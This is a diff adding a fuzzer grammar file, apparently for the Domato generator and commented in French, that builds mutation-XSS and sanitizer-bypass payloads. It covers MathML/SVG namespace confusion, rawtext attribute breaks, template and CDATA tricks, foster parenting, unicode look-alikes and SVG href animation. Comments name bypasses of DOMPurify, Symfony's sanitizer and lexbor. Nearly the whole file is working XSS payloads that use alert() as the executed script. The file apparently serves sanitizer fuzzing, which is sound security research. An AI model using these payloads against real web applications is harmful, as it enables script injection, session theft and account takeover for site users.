@@ -1,0 +1,255 @@
+# [PAI] BEGIN — mxss.txt — Grammaire paramétrée mXSS & Sanitizer Bypass
+# Restructuré depuis payloads fixes vers classes de techniques avec pools variables.
+# Chaque génération tire dans les pools → combinaisons inédites à chaque fichier.
+
+# ============================================================
+# POOLS — éléments interchangeables par classe sémantique
+# ============================================================
+
+# MathML HTML integration points (contenu repassé au parseur HTML)
+# annotation-xml exclu : attributs dans l'opening tag = closing tag impossible en variable
+<mathml_hip> = mtext
+<mathml_hip> = mi
+<mathml_hip> = mo
+<mathml_hip> = ms
+#<mathml_hip> = /p
+#<mathml_hip> = /br
+
+# SVG HTML integration points (contenu parsé en namespace xhtml)
+<svg_hip> = desc
+<svg_hip> = title
+<svg_hip> = foreignObject
+#<svg_hip> = /p
+#<svg_hip> = /br
+
+# Éléments rawtext / RCDATA — consomment jusqu'au closing tag correspondant
+<rawtext_elem> = title
+<rawtext_elem> = textarea
+<rawtext_elem> = xmp
+<rawtext_elem> = style
+
+# Éléments rawtext utilisables en contexte SVG foreign content
+<svg_rawtext> = textarea
+<svg_rawtext> = script
+<svg_rawtext> = style
+
+# Tag SVG complet — avec ou sans namespace (DOmato trime les espaces en début de valeur)
+<svg_open_tag> = <lt>svg<gt>
+<svg_open_tag> = <lt>svg xmlns='http://www.w3.org/2000/svg'<gt>
+
+# Nom d'attribut pour les payloads path/a (is, id, class, title)
+<path_attr_name> = is
+<path_attr_name> = id
+<path_attr_name> = class
+<path_attr_name> = title
+
+# ============================================================
+# VECTEURS D'EXÉCUTION
+# ============================================================
+
+<xss_exec> = <lt>img src=x onerror='alert()'<gt>
+<xss_exec> = <lt>svg onload='alert()'<gt>
+<xss_exec> = <lt>details open ontoggle='alert()'<gt>
+
+<xss_exec_attr> = <lt>img src=x onerror=alert()<gt>
+<xss_exec_attr> = <lt>svg onload=alert()<gt>
+<xss_exec_attr> = <lt>details open ontoggle=alert()<gt> 
+
+# ============================================================
+# CLASSE 1 — Foreign content namespace confusion
+# Transitions de parseur HTML ↔ MathML ↔ SVG.
+# Variable : mathml_hip, svg_hip, svg_open_tag
+# ============================================================
+
+# Structure de base : math > HIP > svg > /p (pop du parseur hors SVG)
+#<mxss_foreign_confusion> = <lt>math<gt><lt><mathml_hip><gt><lt>svg<gt><lt>/p<gt>
+
+# Avec vecteur injecté dans le contexte après confusion
+#<mxss_foreign_confusion> = <lt>math<gt><lt><mathml_hip><gt><lt>svg<gt><lt>/p<gt><lt><mathml_hip><gt><xss_exec><lt>/svg<gt>
+
+# Via SVG HTML integration point (desc/title/foreignObject)
+<mxss_foreign_confusion> = <svg_open_tag><lt><svg_hip><gt><xss_exec><lt>/<svg_hip><gt><lt>/svg<gt>
+
+# SVG imbriqués — divergence namespace post-pop (P-MXSS-027)
+#<mxss_foreign_confusion> = <svg_open_tag><lt>circle<gt><lt>svg<gt><lt>/p<gt><lt>circle<gt><lt>svg<gt><lt>select<gt><lt>svg<gt>
+
+# Triple confusion math + HIP + svg (P-MXSS-012)
+#<mxss_foreign_confusion> = <lt>math<gt><lt><mathml_hip><gt><lt>svg<gt><lt>/p<gt><lt><mathml_hip><gt><xss_exec><lt>/svg<gt><lt>/<mathml_hip><gt><lt>/math<gt>
+
+# annotation-xml encoding='text/html' — HTML integration point explicite (P-MXSS-023)
+<mxss_foreign_confusion> = <lt>math<gt><lt>annotation-xml encoding='text/html'<gt><xss_exec>
+
+# SVG desc/style avec math imbriqué (P-MXSS-013)
+#<mxss_foreign_confusion> = <lt>svg viewBox='0 0 10 10' xmlns='http://www.w3.org/2000/svg'<gt><lt>math<gt><lt>style<gt><lt>/p<gt><lt>math<gt><lt>/style<gt><lt>desc<gt>texte<lt>/desc<gt><lt>/svg<gt>
+
+# [PAI] REMOVED — <image> normalization (P-MXSS-035 analysé, supprimé du corpus actif)
+#<mxss_foreign_confusion> = <lt>math<gt><lt>image<gt><lt>/math<gt>
+#<mxss_foreign_confusion> = <svg_open_tag><lt>image<gt><lt>/svg<gt>
+#<mxss_foreign_confusion> = <svg_open_tag><lt>image<gt><lt>/p<gt>
+
+# ============================================================
+# CLASSE 2 — Rawtext element attribute value break
+# </rawtext_elem> dans valeur d'attribut clôt l'élément rawtext.
+# Variable : rawtext_elem, attribut cible, xss_exec_attr
+# ============================================================
+
+# Pattern canonique (P-MXSS-032 a/b/c/d)
+#<mxss_rawtext_break> = <lt><rawtext_elem><gt><lt>p title='<lt>/<rawtext_elem><gt><xss_exec_attr>'<gt><lt>/p<gt>
+
+# Avec div et id=
+<mxss_rawtext_break> = <lt><rawtext_elem><gt><lt>div id='<lt>/<rawtext_elem><gt><xss_exec_attr>'<gt>
+
+# Avec a et href=
+<mxss_rawtext_break> = <lt><rawtext_elem><gt><lt>a href='<lt>/<rawtext_elem><gt><xss_exec_attr>'<gt>
+
+# ============================================================
+# CLASSE 3 — Template content mode
+# Contenu dans DocumentFragment — sanitiseurs DOM-live le manquent.
+# Variable : mathml_hip, contexte d'imbrication, xss_exec
+# ============================================================
+
+# Template imbriqué (P-MXSS-006A)
+<mxss_template> = <lt>template<gt><lt>template<gt><xss_exec><lt>/template<gt><lt>/template<gt>
+
+# Template seul
+<mxss_template> = <lt>template<gt><xss_exec><lt>/template<gt>
+
+# Template dans MathML HIP (P-MXSS-003B)
+<mxss_template> = <lt>math<gt><lt><mathml_hip><gt><lt>template<gt><xss_exec><lt>/template<gt><lt>/<mathml_hip><gt><lt>/math<gt>
+
+# Template dans SVG via xmp (P-MXSS-019)
+#<mxss_template> = <lt>xmp<gt><lt>img src='<lt>/xmp<gt><svg_open_tag><lt>/p<gt><lt>template<gt><lt>/table<gt><lt>/p<gt><lt>math<gt><lt>desc<gt>onerror=alert()' <gt>
+
+# Template + CDATA + script (P-MXSS-006B)
+<mxss_template> = <lt>template<gt><lt>script<gt><lt><ex>[CDATA[<xss_exec>]]<lt>/script<gt><lt>/template<gt>
+
+# CDATA + MathML + template (P-MXSS-003A)
+#<mxss_template> = <lt>math<gt><lt>/p<gt><lt>template<gt><lt><ex>[CDATA[alert()<lt>/p<gt><lt>script<gt>\x3c]]<lt>/p<gt><lt>/template<gt><lt>/svg<gt>
+
+# ============================================================
+# CLASSE 4 — Processing instruction / bogus comment
+# <?> → bogus comment HTML5 (§13.2.5.46).
+# Variable : contenu après PI, xss_exec / xss_exec_attr
+# ============================================================
+
+# PI + srcdoc (P-MXSS-001)
+<mxss_pi> = <lt>?<lt>iframe srcdoc='<lt>b<gt><lt>a<gt><xss_exec_attr>'<gt><lt>/iframe<gt>
+
+# PI + srcdoc entités encodées (P-MXSS-002)
+<mxss_pi> = <lt>?<lt>iframe srcdoc='<lt>b<gt>&lt;img src=x onerror=alert()&gt;'<gt><lt>/iframe<gt>
+
+# PI + template + CDATA (P-MXSS-004)
+<mxss_pi> = <lt>?<lt>template<gt><lt>script<gt><lt><ex>[CDATA[<xss_exec>]]<lt>/script<gt><lt>/template<gt>
+
+# PI + plaintext (P-MXSS-010)
+# <mxss_pi> = <lt>?<lt>iframe srcdoc='<lt>b<gt><lt>plaintext id=<lt>script<gt>alert()id=<lt>/script<gt>'<gt><lt>/iframe<gt>
+
+# CDATA hors foreign content + script malformé (P-MXSS-005)
+<mxss_pi> = <lt>a<gt><lt><ex>[CDATA[<gt><lt>script test<lt>/src<gt>]]<lt>/a<gt>
+
+# ============================================================
+# CLASSE 5 — Rawtext en SVG via chaîne de namespaces
+# form+math+HIP+mglyph+svg → <rawtext> traité comme élément générique par lexbor.
+# Variable : mathml_hip, svg_rawtext, path_attr_name
+# ============================================================
+
+# Pattern canonique form/math/mtext/mglyph/svg/mi (P-MXSS-034)
+<mxss_foreign_rawtext> = <lt>form<gt><lt>math<gt><lt><mathml_hip><gt><lt>/form<gt><lt>form<gt><lt>mglyph<gt><lt>svg<gt><lt>mi<gt><lt><svg_rawtext><gt><lt>path <path_attr_name>='<lt>/<svg_rawtext><gt><xss_exec_attr>'<gt>
+
+# Via SVG direct avec /br comme disrupteur (P-MXSS-018)
+#<mxss_foreign_rawtext> = <svg_open_tag><lt>/br<gt><lt><svg_rawtext><gt><lt>a id='<lt>/<svg_rawtext><gt><xss_exec_attr>'<gt>
+
+# Double form imbriqué complexe avec xmp (P-MXSS-030)
+#<mxss_foreign_rawtext> = <lt>form id='outer'<gt><lt>math<gt><lt><mathml_hip><gt><lt>/form<gt><lt>form id='inner'<gt><lt>mi<gt><lt>svg<gt><lt><mathml_hip><gt><lt>form id='outer'<gt><lt>/p<gt><lt>/form<gt><lt>form id='inner'<gt><lt>/p<gt><lt>desc<gt><lt>table<gt><lt>tr<gt><lt>xmp<gt><xss_exec><lt>/table<gt>
+
+# ============================================================
+# CLASSE 6 — Foster parenting & select context
+# Éléments déplacés hors <table> par le parseur.
+# <img> dans <select> ignoré spec §13.2.6.4.10 — Lexbor 2.7.0 ne respecte pas.
+# ============================================================
+
+# Foster parenting complexe table × SVG × select × math (P-MXSS-021)
+#<mxss_foster> = <lt>table<gt><lt>svg<gt><lt>table<gt><lt>svg<gt><lt>select<gt><lt>/p<gt><lt>b<gt><lt>math<gt><lt>/p<gt><lt>select<gt><lt>script<gt><lt>/p<gt><lt>table<gt>
+
+# select context bug : xmp dans caption (P-MXSS-033)
+#<mxss_foster> = <lt>table<gt><lt>caption<gt><lt>xmp<gt><lt>p title='<lt>/xmp<gt><lt>select<gt><xss_exec_attr>'<gt><lt>/p<gt>
+
+# Foster parenting simple b + script dans table (P-MXSS-020)
+<mxss_foster> = <lt>table<gt><lt>b<gt><lt>script<gt><lt>/script<gt>test<lt>/table<gt>
+
+# AAA : <a> imbriqué via table (P-MXSS-031)
+<mxss_foster> = <lt>a id=1<gt><lt>table<gt><lt>a id=2<gt>
+
+# table + caption + div imbriqué (P-MXSS-028)
+<mxss_foster> = <lt>table<gt><lt>p<gt><lt>div<gt><lt>table<gt><lt>/div<gt><lt>caption<gt><lt>table<gt>
+
+# ============================================================
+# CLASSE 7 — Encoding delta / unicode confusion
+# Caractères unicode similaires à ASCII — exploite différences de normalisation.
+# Variable : mathml_hip, encodage cible
+# ============================================================
+
+# U+FF21 (Ａ) fullwidth — bypass javascript: detection (P-MXSS-016A)
+#<mxss_encoding> = <lt>svg<gt><lt>math<gt><lt><mathml_hip><gt><lt>svg<gt><lt>/p<gt><lt>a <ex>[CDATA[<lt>img href = j&<hash>xff21;v&<hash>xff21;script:alert() alert()<lt>/math<gt>clique<lt>/svg<gt>
+
+# U+FE13 (︓) — bypass colon detection, NFKC → : (P-MXSS-016C)
+#<mxss_encoding> = <lt>svg<gt><lt>math<gt><lt><mathml_hip><gt><lt>svg<gt><lt>/p<gt><lt>a <ex>[CDATA[<lt>img href=javascript&<hash>xfe13;alert()<gt>clique<lt>/svg<gt>
+
+# Small form variants U+FExx — gap StringSanitizer Symfony (P-XSS-003)
+<mxss_encoding> = <lt>p title='﹥<lt>script<gt>alert(1)<lt>/script<gt>'<gt>
+
+# U+FF21 seul neutre — passe Symfony et DOMPurify (P-MXSS-016B)
+#<mxss_encoding> = <lt>svg<gt><lt>math<gt><lt><mathml_hip><gt><lt>svg<gt><lt>/p<gt><lt>a <ex>[CDATA[<lt>img href = &<hash>xff21; alert()<lt>/math<gt>clique<lt>/svg<gt>
+
+# ============================================================
+# PAYLOADS FIXES — difficiles à paramétrer, conservés tels quels
+# ============================================================
+
+# Attribute malformé avec <tab> dans nom de tag — lexbor keyword matching (P-MXSS-014)
+<mxss_misc> = <lt>svg<gt><lt>desc<gt><lt>a<tab>n='valeur'<gt>texte<lt>/desc<gt><lt>/svg<gt>
+
+# SVG animate/set : mutation href post-load (P-MXSS-007, P-MXSS-008)
+<mxss_misc> = <lt>svg xmlns='http://www.w3.org/2000/svg'<gt><lt>a href='x'<gt><lt>text<gt>Click Here<lt>/text<gt><lt>set attributeName='href' to='javascript:alert()' /<gt><lt>/a<gt><lt>/svg<gt>
+<mxss_misc> = <lt>svg<gt><lt>a href='x'<gt><lt>text<gt>Click<lt>/text<gt><lt>animate attributeName='href' to='javascript:alert()' begin='0s' dur='1s' fill='freeze'/<gt><lt>/a<gt><lt>/svg<gt>
+
+# xlink:href — divergence namespace Symfony vs DOMPurify (P-MXSS-011B)
+<mxss_misc> = <lt>svg<gt><lt>a xlink:href='javascript:alert()'<gt>click<lt>/a<gt><lt>/svg<gt>
+
+# plaintext en contexte MathML (P-MXSS-017)
+## <mxss_misc> = <lt>li<gt><lt>a<gt><lt>table<gt><lt>li<gt><lt>math<gt><lt>/p<gt><lt>plaintext<gt><lt>mi<gt>
+
+# data: URL non décodée (P-XSS-001)
+<mxss_misc> = <lt>img src='data:text/html,%3cscript%3ealert()%3c/script%3e'<gt>
+
+# CSS content injection (P-CSS-001)
+<mxss_misc> = <lt>q style='quotes: 'onerror' '<gt>';'<gt>test<lt>/q<gt>
+
+# ============================================================
+# VALEUR D'ATTRIBUT mXSS
+# Structure : </rawtext_elem> casse le contexte attribut/rawtext,
+# puis une technique de namespace est injectée dans le flux HTML résultant.
+# Utilisé via <attributestring> dans html.txt pour contaminer n'importe quel attribut.
+# ============================================================
+
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><mxss_foreign_confusion>
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><mxss_foreign_rawtext>
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><mxss_template>
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><mxss_pi>
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><mxss_foster>
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><mxss_encoding>
+<mxss_attr_value> = <lt>/<rawtext_elem><gt><xss_exec>
+
+# ============================================================
+# RACINE — tirage aléatoire parmi les classes de techniques
+# ============================================================
+
+<HTMLmxssElement root=true> = <mxss_foreign_confusion>
+<HTMLmxssElement> = <mxss_rawtext_break>
+<HTMLmxssElement> = <mxss_template>
+<HTMLmxssElement> = <mxss_pi>
+<HTMLmxssElement> = <mxss_foreign_rawtext>
+<HTMLmxssElement> = <mxss_foster>
+<HTMLmxssElement> = <mxss_encoding>
+<HTMLmxssElement> = <mxss_misc>
+
+# [PAI] END
